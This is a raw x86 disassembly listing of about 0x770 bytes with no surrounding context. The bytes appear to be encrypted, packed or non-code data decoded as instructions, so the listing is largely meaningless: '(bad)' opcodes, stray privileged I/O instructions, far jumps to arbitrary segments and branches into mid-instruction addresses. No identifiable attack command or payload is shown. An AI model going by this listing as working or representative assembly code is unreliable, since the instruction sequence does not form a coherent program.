  411804:	sub    DWORD PTR [ebx-0x38],ebx
  411807:	js     0x411811
  411809:	bound  edi,QWORD PTR ds:[edx]
  41180c:	xor    al,0x9b
  41180e:	scas   eax,DWORD PTR es:[edi]
  41180f:	dec    ebx
  411810:	ret    
  411811:	nop
  411812:	test   DWORD PTR ds:0x94ded6bb,edi
  411818:	in     al,dx
  411819:	not    BYTE PTR [esi+ecx*4]
  41181c:	into   
  41181d:	lods   eax,DWORD PTR ds:[esi]
  41181e:	or     cl,BYTE PTR ds:0x52361b42
  411824:	loop   0x411811
  411826:	pop    eax
  411827:	scas   al,BYTE PTR es:[edi]
  411828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411829:	mov    cl,0x5e
  41182b:	sub    edx,DWORD PTR [ecx-0x80]
  41182e:	push   ss
  41182f:	jo     0x4117f4
  411831:	idiv   BYTE PTR [edi+ecx*4]
  411834:	retf   0x7ad5
  411837:	(bad)  [esi-0x20]
  41183a:	mov    dh,0x4f
  41183c:	rcl    DWORD PTR [edx],0x7d
  41183f:	(bad)  
  411840:	in     eax,dx
  411841:	scas   eax,DWORD PTR es:[edi]
  411842:	push   ebp
  411843:	lock add DWORD PTR [esi],ebx
  411846:	xchg   esp,eax
  411847:	xor    ebx,ecx
  411849:	jne    0x411820
  41184b:	out    dx,eax
  41184c:	jg     0x4117eb
  41184e:	aad    0x79
  411850:	push   cs
  411851:	pop    ebp
  411852:	shr    DWORD PTR [edx],cl
  411854:	mov    bh,0xc2
  411856:	xchg   ebx,eax
  411857:	dec    edx
  411858:	cmp    BYTE PTR [ecx+eiz*8],bh
  41185b:	push   0x3e1838ae
  411860:	outs   dx,BYTE PTR ds:[esi]
  411861:	mov    DWORD PTR [edi],ecx
  411863:	cmp    al,0x28
  411865:	mov    ebp,0xf975f406
  41186a:	dec    DWORD PTR [edx+0x31bf44e1]
  411870:	adc    al,0x59
  411872:	fwait
  411873:	mov    ecx,0xbd3edc60
  411878:	dec    DWORD PTR [ebx-0x218a8580]
  41187e:	add    ah,BYTE PTR [ecx]
  411880:	adc    eax,0xec72fc62
  411885:	je     0x411812
  411887:	inc    esp
  411888:	xchg   DWORD PTR [ecx-0x56],ebx
  41188b:	fstp   DWORD PTR [ecx]
  41188d:	cld    
  41188e:	fadd   DWORD PTR [ebx]
  411890:	gs nop
  411892:	sub    BYTE PTR [edi+0x5],ch
  411895:	stc    
  411896:	adc    al,0xfa
  411898:	mov    edi,0xca224513
  41189d:	pop    ds
  41189e:	mov    al,ds:0x55227da3
  4118a3:	pusha  
  4118a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118a5:	dec    esp
  4118a6:	shl    DWORD PTR [eax],1
  4118a8:	jo     0x4118a5
  4118aa:	rcl    BYTE PTR ds:0xdb342232,cl
  4118b0:	push   ds
  4118b1:	jo     0x4118c7
  4118b3:	sbb    eax,0x313a854b
  4118b8:	inc    esi
  4118b9:	int    0xd7
  4118bb:	mov    eax,0x5521b4e8
  4118c0:	and    al,0xe2
  4118c2:	cli    
  4118c3:	cmc    
  4118c4:	test   eax,0x8460fc0e
  4118c9:	stc    
  4118ca:	push   ebp
  4118cb:	pop    ecx
  4118cc:	lea    ebx,[eax]
  4118ce:	repnz or DWORD PTR [ebx],esi
  4118d1:	aam    0x31
  4118d3:	sahf   
  4118d4:	js     0x4118cc
  4118d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118d7:	daa    
  4118d8:	push   ss
  4118d9:	mov    ecx,0x64dc0b27
  4118de:	pop    ebx
  4118df:	loope  0x4118dc
  4118e1:	sub    eax,0xe30a97d3
  4118e6:	pushf  
  4118e7:	add    BYTE PTR [eax],cl
  4118e9:	sbb    DWORD PTR [edx+0x5f],eax
  4118ec:	int3   
  4118ed:	cmp    BYTE PTR [edx+0x2],cl
  4118f0:	inc    BYTE PTR [esi+0x3cbfe62d]
  4118f6:	enter  0x3f8a,0x89
  4118fa:	pop    ebp
  4118fb:	mov    ah,0x31
  4118fd:	imul   ebx,DWORD PTR [esi+0x5],0xd7abc0c7
  411904:	cmp    DWORD PTR [esi+ebx*8-0x760cc33d],esp
  41190b:	jae    0x411917
  41190d:	aam    0x9f
  41190f:	fnstsw WORD PTR [edi-0x2933e9bc]
  411915:	aaa    
  411916:	fisttp WORD PTR [edi+0x6f]
  411919:	pushf  
  41191a:	mov    es:0x5fb05093,al
  411920:	sbb    DWORD PTR [esi-0x29],esp
  411923:	inc    ebp
  411924:	outs   dx,DWORD PTR ds:[esi]
  411925:	cld    
  411926:	push   esp
  411927:	stc    
  411928:	cwde   
  411929:	imul   eax,DWORD PTR [esi+0x73f71da9],0x915e92bc
  411933:	sub    BYTE PTR [esi],dl
  411935:	xchg   ebp,eax
  411936:	xlat   BYTE PTR ds:[ebx]
  411937:	jmp    0x4edb:0x2d46029a
  41193e:	jecxz  0x4119b0
  411940:	addr16 jp 0x41191d
  411943:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411944:	inc    esp
  411945:	mov    dh,0xc5
  411947:	sar    BYTE PTR [eax+0x7],0xd5
  41194b:	fiadd  WORD PTR [ebx-0x27]
  41194e:	sbb    bl,BYTE PTR [eax+0x2820b3bd]
  411954:	xchg   ebp,eax
  411955:	sub    DWORD PTR [esi],ebx
  411957:	cmp    BYTE PTR [edi],dl
  411959:	lods   eax,DWORD PTR ds:[esi]
  41195a:	aas    
  41195b:	daa    
  41195c:	and    dl,BYTE PTR [eax]
  41195e:	xor    dl,BYTE PTR [ebx-0x3fc708c5]
  411964:	push   edx
  411965:	in     al,0x7b
  411967:	pop    esi
  411968:	pop    es
  411969:	dec    ebp
  41196a:	sub    eax,0x795888d1
  41196f:	mov    bl,0xc7
  411971:	jle    0x4119d8
  411973:	sbb    al,0xc5
  411976:	pop    ds
  411977:	ds mov ebp,0x1a55325b
  41197d:	push   edi
  41197e:	mov    bl,0xfc
  411980:	ss jle 0x411939
  411983:	ret    0xfe74
  411986:	xchg   ebp,eax
  411987:	mov    bl,0xd6
  411989:	lock inc ebx
  41198b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41198c:	retf   0x228e
  41198f:	xchg   BYTE PTR [esi-0x549a3dab],dh
  411995:	add    ch,BYTE PTR [ebp+0x77c0b7d]
  41199b:	(bad)  
  41199c:	iret   
  41199d:	mov    bh,0x64
  41199f:	fidivr WORD PTR [ecx+ebp*2-0x55cf2487]
  4119a6:	out    dx,eax
  4119a7:	xor    BYTE PTR [edx],dh
  4119a9:	pop    es
  4119aa:	push   edx
  4119ab:	and    esp,ebp
  4119ad:	pop    ds
  4119ae:	(bad)  
  4119af:	inc    DWORD PTR [edx-0x5c071821]
  4119b5:	ss data16 int3 
  4119b8:	add    ebp,DWORD PTR [ebx]
  4119ba:	or     ch,BYTE PTR [edx-0x6f14cf53]
  4119c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119c1:	bound  edx,QWORD PTR [edx+eax*1+0x570ac19b]
  4119c8:	sbb    BYTE PTR [ecx],0x49
  4119cb:	scas   al,BYTE PTR es:[edi]
  4119cc:	fisttp QWORD PTR [ebp-0x11]
  4119cf:	rcr    BYTE PTR [ecx],cl
  4119d1:	add    al,al
  4119d3:	scas   al,BYTE PTR es:[edi]
  4119d4:	mov    ds:0x4e6649e2,al
  4119d9:	lods   eax,DWORD PTR ds:[esi]
  4119da:	xor    BYTE PTR [ecx-0x1c8a8fbb],dl
  4119e0:	inc    ebp
  4119e1:	sbb    DWORD PTR [edx],0x66
  4119e4:	mov    al,0x9b
  4119e6:	cmp    bh,dl
  4119e8:	fisub  WORD PTR [edi+eax*4]
  4119eb:	repnz imul esi,DWORD PTR [esi+0x320faa9e],0x1b
  4119f3:	mov    al,ds:0x86e11670
  4119f8:	add    al,0xdc
  4119fa:	and    al,0x5
  4119fc:	xchg   ecx,eax
  4119fd:	xor    al,0x1d
  4119ff:	daa    
  411a00:	cwde   
  411a01:	xchg   ebx,eax
  411a02:	les    esp,FWORD PTR [edi]
  411a04:	(bad)  
  411a06:	mov    bl,0xf5
  411a08:	mov    eax,0x199dd08b
  411a0d:	ins    DWORD PTR es:[edi],dx
  411a0e:	call   0xd4fedd9
  411a13:	or     BYTE PTR ds:0x339715fd,bl
  411a19:	sar    BYTE PTR [edx],cl
  411a1b:	out    dx,eax
  411a1c:	adc    dh,BYTE PTR [ecx+0x3]
  411a1f:	push   es
  411a20:	daa    
  411a21:	adc    esi,DWORD PTR [ebx]
  411a23:	add    al,BYTE PTR [eax]
  411a25:	mov    ebp,0x9327ce7b
  411a2a:	int3   
  411a2b:	cld    
  411a2c:	mov    ah,0xa2
  411a2e:	adc    BYTE PTR [ecx-0x53],ah
  411a31:	shl    esi,1
  411a33:	jmp    0x4a62:0x85a8fa06
  411a3a:	div    esp
  411a3c:	lahf   
  411a3d:	push   edi
  411a3e:	sub    DWORD PTR [ebp+0x2b],ebp
  411a41:	stos   DWORD PTR es:[edi],eax
  411a42:	add    al,0xfe
  411a44:	xor    dh,BYTE PTR [edx+eiz*1]
  411a47:	xor    eax,0xcb3ac254
  411a4c:	fdivr  st,st(2)
  411a4e:	adc    BYTE PTR [ebx+0x3fbfe806],0x6b
  411a55:	pop    es
  411a56:	arpl   WORD PTR [edi],sp
  411a58:	xchg   esi,eax
  411a59:	pusha  
  411a5a:	mov    es,ebx
  411a5c:	pop    ebp
  411a5d:	ret    0xd233
  411a60:	dec    esi
  411a61:	sti    
  411a62:	jnp    0x4119ed
  411a64:	int3   
  411a65:	sbb    esi,DWORD PTR [eax+0x72009f57]
  411a6b:	sub    eax,0x1a6fc1f7
  411a70:	push   ebp
  411a71:	pop    ebx
  411a72:	mov    eax,0xc521352d
  411a77:	loopne 0x411a10
  411a79:	fs xchg ebx,eax
  411a7b:	cdq    
  411a7c:	repz sbb dh,BYTE PTR [edi+0x6e]
  411a80:	xchg   ebp,eax
  411a81:	stos   BYTE PTR es:[edi],al
  411a82:	je     0x411a37
  411a84:	clc    
  411a85:	pop    esi
  411a86:	sub    DWORD PTR [ecx-0x74],edi
  411a89:	loop   0x411a65
  411a8b:	int3   
  411a8c:	das    
  411a8d:	adc    eax,0xe88c0c35
  411a92:	pushf  
  411a93:	xor    ebx,DWORD PTR [ebp-0x19]
  411a96:	hlt    
  411a97:	dec    ecx
  411a98:	fnstenv [esi]
  411a9a:	out    dx,eax
  411a9b:	add    eax,0x3dfa7ef7
  411aa0:	cs dec edi
  411aa2:	loopne 0x411ac5
  411aa4:	in     eax,dx
  411aa5:	sub    eax,0x547855d9
  411aaa:	jae    0x411ae4
  411aac:	in     al,0xa0
  411aae:	dec    esp
  411aaf:	dec    eax
  411ab0:	sbb    DWORD PTR ds:0xb0540d60,esp
  411ab6:	mov    ch,0x8f
  411ab8:	pop    edx
  411ab9:	or     DWORD PTR [edx+0x33],eax
  411abc:	inc    ebp
  411abd:	mov    ch,0x3f
  411abf:	inc    edi
  411ac0:	(bad)  
  411ac1:	mov    eax,0x767f80b1
  411ac6:	call   0xd395:0x926c4dd
  411acd:	pop    ss
  411ace:	(bad)  
  411acf:	mov    edi,0xf8d797c
  411ad4:	sub    eax,DWORD PTR [ecx+0x862c77e]
  411ada:	je     0x411b25
  411adc:	mov    bl,0x37
  411ade:	push   esp
  411adf:	xor    bl,bl
  411ae1:	cwde   
  411ae2:	jnp    0x411aca
  411ae4:	or     ecx,DWORD PTR [ecx+0x13452c2e]
  411aea:	or     ebp,DWORD PTR [ecx+0x3b]
  411aed:	push   esi
  411aee:	outs   dx,BYTE PTR ds:[esi]
  411aef:	cmc    
  411af0:	das    
  411af1:	mov    al,ds:0x30645162
  411af6:	xor    BYTE PTR [ecx-0x2fcfb1b5],0x68
  411afd:	outs   dx,DWORD PTR ds:[esi]
  411afe:	icebp  
  411aff:	(bad)  
  411b01:	inc    eax
  411b02:	cli    
  411b03:	push   esp
  411b04:	xor    eax,0xac73eaad
  411b09:	ds xchg ecx,eax
  411b0b:	in     eax,0x7
  411b0d:	stos   BYTE PTR es:[edi],al
  411b0e:	push   eax
  411b0f:	int3   
  411b10:	xor    BYTE PTR [ecx],bl
  411b12:	stos   DWORD PTR es:[edi],eax
  411b13:	stc    
  411b14:	mov    ah,0x59
  411b16:	mov    edi,0xaf41e5c0
  411b1b:	vminss xmm6,xmm5,DWORD PTR [ebp+0x1e]
  411b20:	mov    edi,0x367a0c26
  411b25:	push   edi
  411b26:	imul   ecx,DWORD PTR [ebx+0x44],0xffffff8c
  411b2a:	pop    ss
  411b2b:	dec    ecx
  411b2c:	pop    esp
  411b2d:	adc    al,BYTE PTR [eax]
  411b2f:	xchg   esp,eax
  411b30:	sbb    esp,DWORD PTR [edx-0x9]
  411b33:	aam    0x8d
  411b35:	bound  ebx,QWORD PTR [edx-0x41]
  411b38:	mov    fs,WORD PTR [ebp+edi*8+0x52ccd0bc]
  411b3f:	test   al,0x2e
  411b41:	jle    0x411ad3
  411b43:	cmp    BYTE PTR [edx],dl
  411b45:	dec    esi
  411b46:	inc    edi
  411b47:	enter  0x7b10,0xef
  411b4b:	repz call 0xbf4b9bb
  411b51:	xchg   edi,eax
  411b52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b53:	scas   eax,DWORD PTR es:[edi]
  411b54:	jno    0x411b78
  411b56:	shl    BYTE PTR [ebp+edi*8-0x5e],0x82
  411b5b:	and    edi,DWORD PTR [edi+0x7ca6208b]
  411b61:	mov    bl,BYTE PTR [ecx+0x6dae952e]
  411b67:	inc    ecx
  411b68:	pop    eax
  411b69:	xor    DWORD PTR [eax],eax
  411b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b6c:	jns    0x411baa
  411b6e:	js     0x411b59
  411b70:	mov    eax,DWORD PTR [edx]
  411b72:	jl     0x411b89
  411b74:	xor    BYTE PTR [ebp+0x2f],dh
  411b77:	xchg   ebx,eax
  411b78:	cmp    esi,DWORD PTR [esp+ecx*8-0x41388539]
  411b7f:	mov    DWORD PTR [esp+ebx*8],eax
  411b82:	cmp    al,0xc6
  411b84:	aam    0x49
  411b86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b87:	pop    ebx
  411b88:	ds (bad) 
  411b8a:	dec    ebx
  411b8b:	jp     0x411bff
  411b8d:	clc    
  411b8e:	and    DWORD PTR [edi+0x12],ebp
  411b91:	fst    st(5)
  411b93:	ins    BYTE PTR es:[edi],dx
  411b94:	dec    edi
  411b95:	add    eax,0xe9bacd4f
  411b9a:	jg     0x411b42
  411b9c:	sub    DWORD PTR [edx-0x1444ac71],edi
  411ba2:	add    BYTE PTR [ecx],al
  411ba4:	or     BYTE PTR [edx],ch
  411ba6:	cmp    al,0xf8
  411ba8:	push   esp
  411ba9:	not    BYTE PTR [ecx-0x64]
  411bac:	mov    dl,0x27
  411bae:	push   0xffffffd8
  411bb0:	dec    edi
  411bb1:	fsub   DWORD PTR [edx+0x53972cc0]
  411bb7:	pop    DWORD PTR [ecx+ebx*2-0x3c5f8f6a]
  411bbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bbf:	loop   0x411b9f
  411bc1:	out    dx,eax
  411bc2:	cmp    BYTE PTR [edi],dh
  411bc4:	addr16 or eax,0x615ce8e1
  411bca:	xor    eax,0x1a509c4f
  411bd0:	push   0xffffffcb
  411bd2:	xchg   BYTE PTR [ecx+0xa],al
  411bd5:	int    0xc2
  411bd7:	nop
  411bd8:	(bad)  
  411bd9:	retf   
  411bda:	dec    esp
  411bdb:	push   edx
  411bdc:	dec    ebp
  411bdd:	pop    ebx
  411bde:	lods   eax,DWORD PTR ds:[esi]
  411bdf:	(bad)  
  411be1:	popf   
  411be2:	jmp    0x411bf7
  411be4:	mov    edi,0xccd7251b
  411be9:	or     bh,ah
  411beb:	call   0x7c26:0x25fe6938
  411bf2:	mov    edi,0x83119a4
  411bf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bf8:	cs out 0x92,eax
  411bfb:	adc    eax,0xd43c10d6
  411c00:	in     eax,dx
  411c01:	into   
  411c02:	mov    esp,0x8a78f05f
  411c07:	xchg   DWORD PTR [ebp+0x34],edx
  411c0a:	popa   
  411c0b:	push   cs
  411c0c:	ror    DWORD PTR [ebp-0x4d9c371d],1
  411c12:	push   edx
  411c13:	(bad)  
  411c14:	std    
  411c15:	and    ebp,eax
  411c17:	fcom   DWORD PTR [ecx]
  411c19:	push   ebx
  411c1a:	mov    eax,ds:0xc39506cb
  411c1f:	(bad)  
  411c20:	dec    esp
  411c21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c22:	retf   
  411c23:	or     ch,al
  411c25:	mov    ecx,0xdda6ab3e
  411c2a:	sub    DWORD PTR [bp+di-0x38],esp
  411c2e:	loope  0x411bd1
  411c30:	xchg   esi,eax
  411c31:	push   esi
  411c32:	push   esi
  411c33:	jae    0x411c98
  411c35:	dec    ecx
  411c36:	xor    cl,al
  411c38:	bound  ecx,QWORD PTR ds:0x9181edd9
  411c3e:	or     al,0x7a
  411c40:	inc    edx
  411c41:	icebp  
  411c42:	push   ebp
  411c43:	inc    esi
  411c44:	inc    ecx
  411c45:	cmp    edi,DWORD PTR [eax]
  411c47:	cmp    ecx,ebx
  411c49:	and    ah,BYTE PTR [eax]
  411c4b:	imul   BYTE PTR [edi-0x3]
  411c4e:	das    
  411c4f:	or     BYTE PTR [eax-0xfce0f7c],ch
  411c55:	sti    
  411c56:	pop    ebx
  411c57:	hlt    
  411c58:	push   edi
  411c59:	xor    eax,0x5011822d
  411c5e:	jo     0x411be9
  411c60:	pop    eax
  411c61:	inc    ebp
  411c62:	lock mov ds:0xa8fe75b4,eax
  411c68:	stc    
  411c69:	(bad)  
  411c6a:	sub    BYTE PTR [ebx+0x6b95d87b],ch
  411c70:	cmp    eax,0xb5ef089e
  411c75:	or     DWORD PTR [edx],esp
  411c77:	ret    
  411c78:	scas   eax,DWORD PTR es:[edi]
  411c79:	sbb    al,0x3b
  411c7b:	mov    dh,0x88
  411c7d:	inc    esp
  411c7e:	dec    ebx
  411c7f:	dec    ebx
  411c80:	mov    al,ds:0xa6a02344
  411c85:	idiv   dh
  411c87:	inc    ecx
  411c88:	push   ecx
  411c89:	jno    0x411c75
  411c8b:	imul   edi,DWORD PTR [ecx],0xa91f17af
  411c91:	dec    eax
  411c92:	sub    DWORD PTR [ebp+0x6d1c93c1],eax
  411c98:	or     DWORD PTR ds:0x13d6c0b9,edx
  411c9e:	mov    ebx,0xbeefae59
  411ca3:	imul   eax,edi,0x293a1690
  411ca9:	sub    al,0x84
  411cab:	pop    ebx
  411cac:	mov    ds:0xd8332bef,al
  411cb1:	sti    
  411cb2:	imul   esp,DWORD PTR [esi+0x3e],0x39b116af
  411cb9:	(bad)  
  411cba:	jp     0x411d0d
  411cbc:	pop    ds
  411cbd:	push   eax
  411cbe:	mov    al,ds:0x59da53e8
  411cc3:	push   eax
  411cc4:	jno    0x411cf3
  411cc6:	lea    ebp,[ecx]
  411cc8:	pusha  
  411cc9:	rol    BYTE PTR [ebx],cl
  411ccb:	test   al,0xfa
  411ccd:	ins    DWORD PTR es:[edi],dx
  411cce:	int3   
  411ccf:	lea    ebx,ds:0x4ed4340d
  411cd5:	sar    DWORD PTR [ebx],cl
  411cd7:	mov    dl,0x80
  411cd9:	dec    edx
  411cda:	lea    esi,ds:0x6b4a33c4
  411ce0:	mov    edx,0x3bff320e
  411ce5:	bnd je 0x411cfb
  411ce8:	sub    eax,0x8b5d7e93
  411ced:	dec    eax
  411cee:	lods   eax,DWORD PTR ds:[esi]
  411cef:	xor    al,0x8f
  411cf1:	retf   
  411cf2:	retf   
  411cf3:	adc    al,0x83
  411cf5:	rol    DWORD PTR [ecx],0xff
  411cf8:	gs aas 
  411cfa:	jmp    DWORD PTR [eax-0x45]
  411cfd:	adc    ah,dl
  411cff:	in     eax,dx
  411d00:	mov    edx,DWORD PTR [esi+0xebc920a]
  411d06:	push   ebx
  411d07:	push   esp
  411d08:	xchg   ecx,eax
  411d09:	ds nop
  411d0b:	outs   dx,DWORD PTR ds:[esi]
  411d0c:	jae    0x411d01
  411d0e:	mov    ebp,0x3f29c6db
  411d13:	and    ebx,esp
  411d15:	xchg   esp,eax
  411d16:	repz pop ebp
  411d18:	es test eax,0xf4047f24
  411d1e:	pusha  
  411d1f:	mov    ecx,DWORD PTR [ebp+0x6b]
  411d22:	or     BYTE PTR [esi+0xbd19bc8],ch
  411d28:	imul   ebx,DWORD PTR [edx],0xffffffb4
  411d2b:	mov    WORD PTR [eax+0x4c],?
  411d2e:	add    eax,0x2fd3eb28
  411d33:	nop
  411d34:	int3   
  411d35:	popf   
  411d36:	adc    edx,DWORD PTR [eax+0x4b]
  411d39:	scas   eax,DWORD PTR es:[edi]
  411d3a:	cld    
  411d3b:	ds idiv edx
  411d3e:	stc    
  411d3f:	add    al,BYTE PTR [esi+ebp*1-0x7874ae2d]
  411d46:	nop
  411d47:	xchg   esi,eax
  411d48:	shl    BYTE PTR [ebx+edi*1+0xff8fde6],1
  411d4f:	cld    
  411d50:	dec    BYTE PTR [edx-0x551fb5b]
  411d56:	sbb    bh,ch
  411d58:	jmp    0xd0c4:0xc86f0b2a
  411d5f:	(bad)  
  411d60:	dec    esi
  411d61:	jb     0x411dc1
  411d63:	imul   esi,edi,0x119a3a2a
  411d69:	inc    ecx
  411d6a:	lods   al,BYTE PTR ds:[esi]
  411d6b:	inc    eax
  411d6c:	imul   ebx,DWORD PTR [edx-0x40],0xffffffb7
  411d70:	das    
  411d71:	cs scas al,BYTE PTR es:[edi]
  411d73:	jmp    DWORD PTR [edx-0x3e]
  411d76:	ss pop ecx
  411d78:	clc    
  411d79:	pop    edx
  411d7a:	(bad)  
  411d7b:	ins    BYTE PTR es:[edi],dx
  411d7c:	pop    es
  411d7d:	add    eax,0x20153995
  411d82:	cmc    
  411d83:	add    BYTE PTR [esi+eiz*2-0x58],ah
  411d87:	fcomp  DWORD PTR [eax+ebp*8]
  411d8a:	in     eax,0xa2
  411d8c:	ror    DWORD PTR [ebx],0xbc
  411d8f:	cmp    edx,DWORD PTR [ebx+0x5dbfa647]
  411d95:	inc    edx
  411d96:	and    eax,0x83b265b
  411d9b:	jg     0x411d2b
  411d9d:	fld    DWORD PTR [ecx+0x95c1db3]
  411da3:	scas   eax,DWORD PTR es:[edi]
  411da4:	ss pop ebx
  411da6:	cwde   
  411da7:	scas   al,BYTE PTR es:[edi]
  411da8:	int3   
  411da9:	push   ecx
  411daa:	sub    DWORD PTR [ebp+0x1e],eax
  411dad:	and    al,0x5b
  411daf:	nop
  411db0:	sbb    al,0xb5
  411db2:	push   es
  411db3:	stc    
  411db4:	xchg   ebp,eax
  411db5:	push   ss
  411db6:	mov    esi,0xcda2e63f
  411dbb:	das    
  411dbc:	outs   dx,DWORD PTR ds:[esi]
  411dbd:	ss dec ebx
  411dbf:	jge    0x411dd3
  411dc1:	ss retf 0x824
  411dc5:	ins    BYTE PTR es:[edi],dx
  411dc6:	sti    
  411dc7:	in     al,dx
  411dc8:	femms  
  411dca:	xchg   edi,eax
  411dcb:	xor    ebp,edx
  411dcd:	jae    0x411d91
  411dcf:	outs   dx,BYTE PTR ds:[esi]
  411dd0:	mov    esp,0x37f65e2b
  411dd5:	and    esi,0x25f26531
  411ddb:	dec    ebx
  411ddc:	shl    cl,1
  411dde:	das    
  411ddf:	out    0xa0,eax
  411de1:	stc    
  411de2:	scas   al,BYTE PTR es:[edi]
  411de3:	inc    edi
  411de4:	aas    
  411de5:	test   DWORD PTR [esi+0x76],0x82edcb63
  411dec:	or     eax,0x72bed02b
  411df1:	adc    al,0x64
  411df3:	dec    esp
  411df4:	bound  ecx,QWORD PTR [ecx-0x24]
  411df7:	in     al,dx
  411df8:	cmp    bl,BYTE PTR [ebp+eax*4-0x7c]
  411dfc:	jle    0x411e58
  411dfe:	addr16 loop 0x411d9d
  411e01:	aam    0xae
  411e03:	shl    DWORD PTR [edi+ebp*8],0x43
  411e07:	add    al,0xc
  411e09:	inc    eax
  411e0a:	lea    eax,[ebx+0x6b]
  411e0d:	and    al,BYTE PTR [esi]
  411e0f:	rcl    DWORD PTR [ebx+ecx*1-0x3b],cl
  411e13:	adc    dl,BYTE PTR [eax]
  411e15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e16:	pop    esp
  411e17:	dec    DWORD PTR [edx-0xfd50721]
  411e1d:	or     DWORD PTR [esi],edi
  411e1f:	sub    al,0xd0
  411e21:	add    ah,BYTE PTR [eax+edi*4]
  411e24:	test   BYTE PTR [eax+0x6c],cl
  411e27:	sbb    al,0x51
  411e29:	test   BYTE PTR [edx+0x5f],ah
  411e2c:	mov    eax,ds:0x3d49568d
  411e31:	popf   
  411e32:	jb     0x411e28
  411e34:	(bad)  
  411e35:	lods   eax,DWORD PTR ds:[esi]
  411e36:	mov    al,ds:0x52556435
  411e3b:	into   
  411e3c:	and    BYTE PTR [edx-0x4b7ab86f],cl
  411e42:	sbb    DWORD PTR fs:[esi+ebx*2+0x5d],ebp
  411e47:	jnp    0x411dcc
  411e49:	jmp    0xbb3d:0xade0d4e7
  411e50:	jno    0x411e21
  411e52:	enter  0x7b2b,0x76
  411e56:	mov    eax,ds:0x447c66cb
  411e5b:	and    al,ah
  411e5d:	iret   
  411e5e:	mov    al,0xaa
  411e60:	iret   
  411e61:	and    eax,0xe36504df
  411e66:	rcr    DWORD PTR [edi-0x45],1
  411e69:	retf   0x6b07
  411e6c:	xlat   BYTE PTR ds:[ebx]
  411e6d:	mov    ah,0x6d
  411e6f:	cmp    al,0x87
  411e71:	test   BYTE PTR [edx],dl
  411e73:	(bad)  
  411e74:	sub    BYTE PTR ss:[edi-0x65],0x78
  411e79:	mov    DWORD PTR ds:0xc10d1909,edx
  411e7f:	clc    
  411e80:	mov    al,ds:0xa3249801
  411e85:	xchg   edx,eax
  411e86:	xchg   BYTE PTR [ecx+eiz*1-0x64],cl
  411e8a:	mov    ebx,0xc2976c2a
  411e8f:	mov    DWORD PTR [ebx+ebx*4],esp
  411e92:	inc    edx
  411e93:	or     esp,DWORD PTR [eax+0x6b]
  411e96:	sbb    dl,al
  411e98:	push   0x76340985
  411e9d:	xlat   BYTE PTR ds:[ebx]
  411e9e:	inc    esp
  411e9f:	rol    BYTE PTR [esi-0x3f],0xc5
  411ea3:	sub    DWORD PTR [esi+0x7d],ecx
  411ea6:	sbb    DWORD PTR ds:0x7d4f498f,0xffffffa2
  411ead:	dec    ebx
  411eae:	das    
  411eaf:	jbe    0x411f05
  411eb1:	stos   BYTE PTR es:[edi],al
  411eb2:	sbb    ebx,ebx
  411eb4:	test   DWORD PTR [edx],edi
  411eb6:	sub    ebp,edx
  411eb8:	xchg   ecx,eax
  411eb9:	mov    ds:0xa87fad63,eax
  411ebe:	setge  BYTE PTR [esi+0x30]
  411ec2:	dec    esi
  411ec3:	cmp    eax,DWORD PTR [ecx-0x4c64659e]
  411ec9:	(bad)  
  411eca:	fs mov cl,0xe8
  411ecd:	adc    ebx,DWORD PTR [eax+0x2feccf93]
  411ed3:	mov    ah,0xdc
  411ed5:	push   ds
  411ed6:	sbb    al,0xeb
  411ed8:	cmp    eax,0x5be8f414
  411edd:	adc    ecx,DWORD PTR [ebp-0x4c]
  411ee0:	popf   
  411ee1:	in     al,dx
  411ee2:	repnz sbb al,ah
  411ee5:	call   0x5038:0xdb0024e2
  411eec:	fsubr  st,st(4)
  411eee:	dec    edx
  411eef:	ins    DWORD PTR es:[edi],dx
  411ef0:	jns    0x411e93
  411ef2:	sahf   
  411ef3:	(bad)  
  411ef4:	mov    eax,ds:0x92398b3
  411ef9:	xchg   esp,eax
  411efa:	lahf   
  411efb:	sbb    eax,DWORD PTR ds:0xaf4414
  411f01:	jle    0x411f6a
  411f03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f04:	cmp    BYTE PTR [eax+0x7f2eec8c],dl
  411f0a:	fnsetpm(287 only) 
  411f0c:	mov    ah,0xb9
  411f0e:	and    BYTE PTR [esi],bl
  411f10:	xor    DWORD PTR [esi-0x6d4a52b1],ebp
  411f16:	int    0x2d
  411f18:	pop    ss
  411f19:	xor    dh,BYTE PTR [ecx+0xf]
  411f1c:	in     al,dx
  411f1d:	rep outs dx,BYTE PTR ds:[esi]
  411f1f:	or     BYTE PTR [esi],bl
  411f21:	mov    edi,0xd06aef63
  411f26:	push   0x779fb23d
  411f2b:	std    
  411f2c:	push   es
  411f2d:	add    ch,BYTE PTR [ebx+ecx*4-0x29]
  411f31:	cmp    esi,DWORD PTR [esi]
  411f33:	pushf  
  411f34:	mov    dl,0x89
  411f36:	fdivr  DWORD PTR [ecx]
  411f38:	fmul   DWORD PTR [eax-0x4b36f20e]
  411f3e:	xor    al,0x34
  411f40:	mov    dh,0xb6
  411f42:	add    dh,ch
  411f44:	sub    DWORD PTR [edx+edi*4-0x59],esp
  411f48:	enter  0x17bb,0x82
  411f4c:	das    
  411f4d:	xchg   esi,eax
  411f4e:	adc    al,0x29
  411f50:	dec    esi
  411f51:	or     eax,0xeca9eb55
  411f56:	ret    0x8342
  411f59:	fisttp WORD PTR [ecx-0x5c]
  411f5c:	pushf  
  411f5d:	push   es
  411f5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f5f:	mov    al,0x81
  411f61:	adc    esi,edx
  411f63:	mov    ds:0x936f419d,eax
  411f68:	xor    DWORD PTR ds:0x56c620a6,esi
  411f6e:	push   0xffffffbb
  411f70:	ins    DWORD PTR es:[edi],dx
  411f71:	(bad)  
  411f72:	out    dx,al
  411f73:	(bad)  
  411f75:	push   edx
